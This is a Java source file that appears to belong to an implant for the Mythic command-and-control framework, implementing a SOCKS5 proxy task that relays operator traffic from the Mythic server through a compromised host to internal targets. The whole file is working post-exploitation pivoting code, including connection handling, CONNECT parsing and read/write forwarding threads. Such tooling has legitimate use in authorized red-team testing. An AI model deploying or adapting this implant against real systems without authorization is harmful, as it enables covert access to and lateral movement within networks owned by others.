package com.woopsie.tasks;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.woopsie.Config;

import java.io.InputStream;
import java.io.OutputStream;
import java.io.FileWriter;
import java.io.PrintWriter;
import java.io.IOException;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketTimeoutException;
import java.nio.ByteBuffer;
import java.text.SimpleDateFormat;
import java.util.Base64;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.BlockingQueue;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.LinkedBlockingQueue;

/**
 * Background task for handling SOCKS5 connections relayed through Mythic
 * Based on oopsie's socks.rs implementation
 */
public class SocksBackgroundTask implements Runnable {
    private final BackgroundTask task;
    private final Config config;
    private static final ObjectMapper mapper = new ObjectMapper();
    
    // SOCKS5 Protocol Constants
    private static final byte SOCKS5_VERSION = 0x05;
    private static final byte NO_AUTH = 0x00;
    private static final byte CMD_CONNECT = 0x01;
    private static final byte ATYP_IPV4 = 0x01;
    private static final byte ATYP_DOMAIN = 0x03;
    private static final byte ATYP_IPV6 = 0x04;
    
    // SOCKS5 Reply Codes
    private static final byte SUCCESS_REPLY = 0x00;
    private static final byte SERVER_FAILURE = 0x01;
    private static final byte CONNECTION_REFUSED = 0x05;
    private static final byte COMMAND_NOT_SUPPORTED = 0x07;
    private static final byte ADDR_TYPE_NOT_SUPPORTED = 0x08;
    
    private static final int BUFFER_SIZE = 4096;
    private static final int SLEEP_INTERVAL_MS = 1;
    
    private final ConcurrentHashMap<Integer, SocksConnection> connections = new ConcurrentHashMap<>();
    private static PrintWriter socksLogWriter;
    private static final SimpleDateFormat timestampFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss.SSS");
    
    static {
        try {
            socksLogWriter = new PrintWriter(new FileWriter("/tmp/woopsie_socks.log", true), true);
            socksLog("=== SOCKS logging initialized ===");
        } catch (IOException e) {
            System.err.println("Failed to initialize SOCKS log file: " + e.getMessage());
        }
    }
    
    private static void socksLog(String message) {
        if (socksLogWriter != null) {
            socksLogWriter.println("[" + timestampFormat.format(new Date()) + "] " + message);
            socksLogWriter.flush();
        }
    }
    
    public SocksBackgroundTask(BackgroundTask task, Config config) {
        this.task = task;
        this.config = config;
    }
    
    @Override
    public void run() {
        socksLog("SOCKS proxy thread started for task " + task.taskId);
        Config.debugLog(config, "[socks] SOCKS proxy thread started");
        
        try {
            // Send initial "listening" response
            Map<String, Object> response = new HashMap<>();
            response.put("task_id", task.taskId);
            response.put("status", "listening");
            response.put("user_output", "SOCKS proxy listening");
            response.put("completed", false);
            task.sendResponse(response);
            
            socksLog("Sent initial listening response");
            Config.debugLog(config, "[socks] Sent initial listening response");
            
            // Main loop - wait for messages from Mythic
            while (task.running) {
                try {
                    // Wait for SOCKS messages from Mythic (with timeout to check running flag)
                    JsonNode message = task.getToTaskQueue().poll(100, java.util.concurrent.TimeUnit.MILLISECONDS);
                    
                    if (message != null) {
                        socksLog("Received message from Mythic: " + message.toString());
                        handleMythicMessage(message);
                    }
                    
                    // Small sleep to avoid busy loop
                    Thread.sleep(SLEEP_INTERVAL_MS);
                    
                } catch (InterruptedException e) {
                    Config.debugLog(config, "[socks] Interrupted, exiting");
                    break;
                }
            }
            
        } catch (Exception e) {
            Config.debugLog(config, "[socks] Error in SOCKS proxy: " + e.getMessage());
        } finally {
            // Clean up all connections
            Config.debugLog(config, "[socks] Cleaning up all connections");
            for (SocksConnection conn : connections.values()) {
                conn.close();
            }
            connections.clear();
            
            // Send final response
            Map<String, Object> response = new HashMap<>();
            response.put("task_id", task.taskId);
            response.put("user_output", "SOCKS proxy stopped");
            response.put("completed", true);
            task.sendResponse(response);
        }
    }
    
    private void handleMythicMessage(JsonNode message) {
        Config.debugLog(config, "[socks] ===== Received message from Mythic =====");
        Config.debugLog(config, "[socks] Full message: " + message.toString());
        
        // Check for jobkill action
        if (message.has("action") && "jobkill".equals(message.get("action").asText())) {
            Config.debugLog(config, "[socks] Received jobkill, stopping SOCKS proxy");
            task.running = false;
            return;
        }
        
        // Parse SOCKS messages - could be array or single message
        JsonNode socksNode = message.has("socks") ? message.get("socks") : message;
        
        Config.debugLog(config, "[socks] Has 'socks' field: " + message.has("socks"));
        Config.debugLog(config, "[socks] socksNode is array: " + socksNode.isArray());
        
        if (socksNode.isArray()) {
            Config.debugLog(config, "[socks] Processing " + socksNode.size() + " SOCKS messages");
            for (JsonNode socksMsgNode : socksNode) {
                processSocksMessage(socksMsgNode);
            }
        } else {
            Config.debugLog(config, "[socks] Processing single SOCKS message");
            processSocksMessage(socksNode);
        }
    }
    
    private void processSocksMessage(JsonNode socksMsgNode) {
        try {
            socksLog("Processing SOCKS message: " + socksMsgNode.toString());
            Config.debugLog(config, "[socks] Processing SOCKS message: " + socksMsgNode.toString());
            
            boolean exit = socksMsgNode.has("exit") && socksMsgNode.get("exit").asBoolean();
            int serverId = socksMsgNode.get("server_id").asInt();
            String dataB64 = socksMsgNode.has("data") ? socksMsgNode.get("data").asText() : null;
            int dataLen = dataB64 != null ? Base64.getDecoder().decode(dataB64).length : 0;
            
            socksLog("server_id=" + serverId + ", exit=" + exit + ", data_len=" + dataLen);
            Config.debugLog(config, "[socks] server_id=" + serverId + ", exit=" + exit + ", has_data=" + (dataB64 != null));
            
            if (exit) {
                // Close connection
                socksLog("Closing connection " + serverId);
                Config.debugLog(config, "[socks] Closing connection " + serverId);
                SocksConnection conn = connections.remove(serverId);
                if (conn != null) {
                    conn.close();
                }
                return;
            }
            
            // Get or create connection
            SocksConnection conn = connections.get(serverId);
            
            if (conn == null && dataB64 != null) {
                // New connection
                socksLog("New connection " + serverId + ", data_len=" + dataLen);
                byte[] data = Base64.getDecoder().decode(dataB64);
                handleNewConnection(serverId, data);
            } else if (conn != null && dataB64 != null) {
                // Existing connection - check if still alive
                if (!conn.running) {
                    socksLog("Connection " + serverId + " is dead, ignoring " + dataLen + " bytes");
                    // Clean up and notify Mythic
                    connections.remove(serverId);
                    sendSocksData(serverId, null, true);
                    return;
                }
                
                // Forward data
                byte[] data = Base64.getDecoder().decode(dataB64);
                
                if (conn.state == ConnectionState.AWAITING_CONNECT) {
                    // This is the CONNECT request
                    socksLog("Connection " + serverId + " awaiting CONNECT, data_len=" + dataLen);
                    handleConnect(conn, data);
                } else if (conn.state == ConnectionState.CONNECTED) {
                    // Forward data to target
                    socksLog("Forwarding " + dataLen + " bytes to target for connection " + serverId);
                    conn.sendToTarget(data);
                }
            }
            
        } catch (Exception e) {
            Config.debugLog(config, "[socks] Error processing SOCKS message: " + e.getMessage());
        }
    }
    
    private void handleNewConnection(int serverId, byte[] initialData) {
        Config.debugLog(config, "[socks] Handling new connection " + serverId);
        
        if (initialData.length < 3 || initialData[0] != SOCKS5_VERSION) {
            Config.debugLog(config, "[socks] Invalid SOCKS5 version or too short");
            return;
        }
        
        // Check if this is a CONNECT request or auth negotiation
        boolean looksLikeConnect = initialData.length >= 10
                && initialData[1] == CMD_CONNECT
                && initialData[2] == 0x00
                && (initialData[3] == ATYP_IPV4
                || initialData[3] == ATYP_DOMAIN
                || initialData[3] == ATYP_IPV6);
        
        if (looksLikeConnect) {
            // Pure CONNECT request - client already did auth
            Config.debugLog(config, "[socks] Detected pure CONNECT request");
            SocksConnection conn = new SocksConnection(serverId);
            connections.put(serverId, conn);
            handleConnect(conn, initialData);
        } else {
            // Auth negotiation
            int nmethods = initialData[1] & 0xFF;
            int authLen = 2 + nmethods;
            
            if (nmethods < 1 || nmethods > 10 || initialData.length < authLen) {
                Config.debugLog(config, "[socks] Invalid auth message");
                return;
            }
            
            Config.debugLog(config, "[socks] Auth negotiation, nmethods=" + nmethods);
            
            // Send auth response
            byte[] authResponse = new byte[]{SOCKS5_VERSION, NO_AUTH};
            sendSocksData(serverId, authResponse, false);
            
            // Store pending connection
            SocksConnection conn = new SocksConnection(serverId);
            conn.state = ConnectionState.AWAITING_CONNECT;
            connections.put(serverId, conn);
            
            // Check if there's concatenated CONNECT request
            if (initialData.length > authLen) {
                byte[] remaining = new byte[initialData.length - authLen];
                System.arraycopy(initialData, authLen, remaining, 0, remaining.length);
                
                if (remaining.length >= 10
                        && remaining[0] == SOCKS5_VERSION
                        && remaining[1] == CMD_CONNECT
                        && remaining[2] == 0x00) {
                    Config.debugLog(config, "[socks] Found CONNECT in concatenated message");
                    handleConnect(conn, remaining);
                }
            }
        }
    }
    
    private void handleConnect(SocksConnection conn, byte[] data) {
        Config.debugLog(config, "[socks] Processing CONNECT for connection " + conn.serverId);
        
        // Parse SOCKS5 CONNECT request
        AddrSpec destAddr = parseSocks5Request(data);
        if (destAddr == null) {
            sendSocksErrorReply(conn.serverId, SERVER_FAILURE);
            connections.remove(conn.serverId);
            return;
        }
        
        Config.debugLog(config, "[socks] Connecting to " + destAddr.getAddress());
        
        // Connect to target
        try {
            Socket targetSocket = new Socket();
            InetSocketAddress addr;
            
            if (destAddr.ip != null) {
                addr = new InetSocketAddress(InetAddress.getByName(destAddr.ip), destAddr.port);
            } else {
                addr = new InetSocketAddress(destAddr.fqdn, destAddr.port);
            }
            
            targetSocket.connect(addr, 5000); // 5 second timeout
            // Disable Nagle's algorithm for better RDP/low-latency protocol performance (matches oopsie)
            targetSocket.setTcpNoDelay(true);
            // Don't set buffer sizes - let OS defaults handle it (oopsie doesn't set them either)
            conn.targetSocket = targetSocket;
            conn.state = ConnectionState.CONNECTED;
            
            // Send success reply
            byte[] successReply = buildSocks5SuccessReply();
            sendSocksData(conn.serverId, successReply, false);
            
            Config.debugLog(config, "[socks] Connected to " + destAddr.getAddress());
            
            // Start forwarding thread
            startForwardingThread(conn);
            
        } catch (Exception e) {
            Config.debugLog(config, "[socks] Connection failed: " + e.getMessage());
            sendSocksErrorReply(conn.serverId, CONNECTION_REFUSED);
            connections.remove(conn.serverId);
        }
    }
    
    private void startForwardingThread(SocksConnection conn) {
        // Read thread - reads from target and sends to Mythic
        // Uses approach similar to oopsie: non-blocking socket behavior
        Thread readThread = new Thread(() -> {
            try {
                conn.targetSocket.setSoTimeout(10);
                InputStream in = conn.targetSocket.getInputStream();
                byte[] buffer = new byte[BUFFER_SIZE];
                int packetCount = 0;
                int sleepCounter = 0;
                final int SLEEP_THRESHOLD = 10;
                while (conn.running && !conn.targetSocket.isClosed()) {
                    try {
                        // Reduced delay before reading
                        Thread.sleep(5);
                        long preRead = System.currentTimeMillis();
                        int bytesRead = in.read(buffer);
                        long postRead = System.currentTimeMillis();
                        if (bytesRead > 0) {
                            sleepCounter = 0;
                            packetCount++;
                            byte[] data = new byte[bytesRead];
                            System.arraycopy(buffer, 0, data, 0, bytesRead);
                            socksLog("[TIMING] Read " + bytesRead + " bytes from target (connection " + conn.serverId + ", packet #" + packetCount + ") at " + preRead + " ms, read took " + (postRead - preRead) + " ms");
                            sendSocksData(conn.serverId, data, false);
                            Thread.sleep(10); // Increased delay after each read for pacing
                        } else if (bytesRead < 0) {
                            socksLog("[TIMING] Connection " + conn.serverId + " closed by target at " + System.currentTimeMillis() + " ms");
                            Config.debugLog(config, "[socks] Connection " + conn.serverId + " closed by target");
                            break;
                        }
                    } catch (SocketTimeoutException e) {
                        sleepCounter++;
                        if (sleepCounter >= SLEEP_THRESHOLD) {
                            Thread.sleep(SLEEP_INTERVAL_MS);
                            sleepCounter = 0;
                        }
                    }
                }
                socksLog("[TIMING] Read thread exiting: running=" + conn.running + ", closed=" + conn.targetSocket.isClosed() + ", exit at " + System.currentTimeMillis() + " ms");
            } catch (Exception e) {
                socksLog("[TIMING] Read thread exception: " + e.getMessage() + " at " + System.currentTimeMillis() + " ms");
                Config.debugLog(config, "[socks] Read thread error: " + e.getMessage());
            } finally {
                sendSocksData(conn.serverId, null, true);
                connections.remove(conn.serverId);
                conn.close();
            }
        });

        // Write thread - writes data from Mythic to target  
        Thread writeThread = new Thread(() -> {
            try {
                OutputStream out = conn.targetSocket.getOutputStream();
                while (conn.running && !conn.targetSocket.isClosed()) {
                    try {
                        byte[] buffer = conn.outgoingData.take();
                        Thread.sleep(50); // pacing before write
                        out.write(buffer);
                        out.flush();
                        socksLog("[TIMING] Wrote " + buffer.length + " bytes to target (connection " + conn.serverId + ")");
                        Thread.sleep(50); // pacing after write
                    } catch (InterruptedException e) {
                        break;
                    } catch (java.io.IOException e) {
                        socksLog("[TIMING] Write failed for connection " + conn.serverId + ": " + e.getMessage() + " at " + System.currentTimeMillis() + " ms - stopping connection");
                        conn.running = false;
                        break;
                    }
                }
                socksLog("[TIMING] Write thread exiting normally for connection " + conn.serverId + " at " + System.currentTimeMillis() + " ms");
            } catch (Exception e) {
                socksLog("[TIMING] Write thread exception for connection " + conn.serverId + ": " + e.getMessage() + " at " + System.currentTimeMillis() + " ms");
                Config.debugLog(config, "[socks] Write thread error: " + e.getMessage());
            } finally {
                socksLog("[TIMING] Write thread setting conn.running=false for connection " + conn.serverId + " at " + System.currentTimeMillis() + " ms");
                conn.running = false;
                try {
                    conn.targetSocket.close();
                } catch (Exception ignored) {}
            }
        });
        
        readThread.setDaemon(true);
        readThread.setName("SOCKS-Read-" + conn.serverId);
        writeThread.setDaemon(true);
        writeThread.setName("SOCKS-Write-" + conn.serverId);
        
        conn.forwardThread = readThread;
        
        // Start write thread first (it blocks waiting for data from Mythic)
        writeThread.start();
        // Then start read thread (begins reading from target immediately)
        readThread.start();
    }
    
    private AddrSpec parseSocks5Request(byte[] data) {
        if (data.length < 10 || data[0] != SOCKS5_VERSION || data[1] != CMD_CONNECT || data[2] != 0x00) {
            return null;
        }
        
        byte atyp = data[3];
        AddrSpec addr = new AddrSpec();
        
        try {
            if (atyp == ATYP_IPV4) {
                // IPv4: 4 bytes + 2 bytes port
                if (data.length < 10) return null;
                addr.ip = String.format("%d.%d.%d.%d",
                        data[4] & 0xFF, data[5] & 0xFF, data[6] & 0xFF, data[7] & 0xFF);
                addr.port = ((data[8] & 0xFF) << 8) | (data[9] & 0xFF);
            } else if (atyp == ATYP_DOMAIN) {
                // Domain: 1 byte len + domain + 2 bytes port
                int domainLen = data[4] & 0xFF;
                if (data.length < 5 + domainLen + 2) return null;
                addr.fqdn = new String(data, 5, domainLen);
                addr.port = ((data[5 + domainLen] & 0xFF) << 8) | (data[6 + domainLen] & 0xFF);
            } else if (atyp == ATYP_IPV6) {
                // IPv6: 16 bytes + 2 bytes port
                if (data.length < 22) return null;
                byte[] ipv6Bytes = new byte[16];
                System.arraycopy(data, 4, ipv6Bytes, 0, 16);
                addr.ip = InetAddress.getByAddress(ipv6Bytes).getHostAddress();
                addr.port = ((data[20] & 0xFF) << 8) | (data[21] & 0xFF);
            } else {
                return null;
            }
        } catch (Exception e) {
            return null;
        }
        
        return addr;
    }
    
    private byte[] buildSocks5SuccessReply() {
        // [VER=5, REP=0, RSV=0, ATYP=1, BND.ADDR=0.0.0.0, BND.PORT=0]
        return new byte[]{SOCKS5_VERSION, SUCCESS_REPLY, 0x00, ATYP_IPV4, 0, 0, 0, 0, 0, 0};
    }
    
    private void sendSocksErrorReply(int serverId, byte replyCode) {
        byte[] errorReply = new byte[]{SOCKS5_VERSION, replyCode, 0x00, ATYP_IPV4, 0, 0, 0, 0, 0, 0};
        sendSocksData(serverId, errorReply, true);
    }
    
    private void sendSocksData(int serverId, byte[] data, boolean exit) {
        try {
            Map<String, Object> socksMsg = new HashMap<>();
            socksMsg.put("exit", exit);
            socksMsg.put("server_id", serverId);
            if (data != null && data.length > 0) {
                socksMsg.put("data", Base64.getEncoder().encodeToString(data));
            }
            
            Map<String, Object> response = new HashMap<>();
            response.put("socks", new Map[]{socksMsg});
            
            socksLog("Sending SOCKS response to Mythic: server_id=" + serverId + ", exit=" + exit + ", data_len=" + (data != null ? data.length : 0));
            Config.debugLog(config, "[socks] Queuing SOCKS response: server_id=" + serverId + ", exit=" + exit + ", data_len=" + (data != null ? data.length : 0));
            
            // Use blocking sendResponse to ensure data delivery
            // The socket timeout will prevent us from reading too fast
            task.sendResponse(response);
            Config.debugLog(config, "[socks] Response queued successfully");
        } catch (Exception e) {
            socksLog("Error sending SOCKS data: " + e.getMessage());
            Config.debugLog(config, "[socks] Error sending SOCKS data: " + e.getMessage());
            if (config.isDebug()) {
                e.printStackTrace();
            }
        }
    }
    
    /**
     * Connection state enum
     */
    private enum ConnectionState {
        AWAITING_CONNECT,
        CONNECTED
    }
    
    /**
     * SOCKS connection wrapper
     */
    private static class SocksConnection {
        final int serverId;
        ConnectionState state;
        Socket targetSocket;
        Thread forwardThread;
        BlockingQueue<byte[]> outgoingData;
        volatile boolean running;
        
        SocksConnection(int serverId) {
            this.serverId = serverId;
            this.state = ConnectionState.AWAITING_CONNECT;
            this.outgoingData = new LinkedBlockingQueue<>();
            this.running = true;
        }
        
        void sendToTarget(byte[] data) {
            if (running && !targetSocket.isClosed()) {
                outgoingData.offer(data);
            }
        }
        
        void close() {
            running = false;
            if (targetSocket != null && !targetSocket.isClosed()) {
                try {
                    targetSocket.close();
                } catch (Exception ignored) {
                }
            }
            if (forwardThread != null) {
                forwardThread.interrupt();
            }
        }
    }
    
    /**
     * Address specification
     */
    private static class AddrSpec {
        String fqdn;
        String ip;
        int port;
        
        String getAddress() {
            if (ip != null) {
                return ip + ":" + port;
            } else if (fqdn != null) {
                return fqdn + ":" + port;
            }
            return "";
        }
    }
}
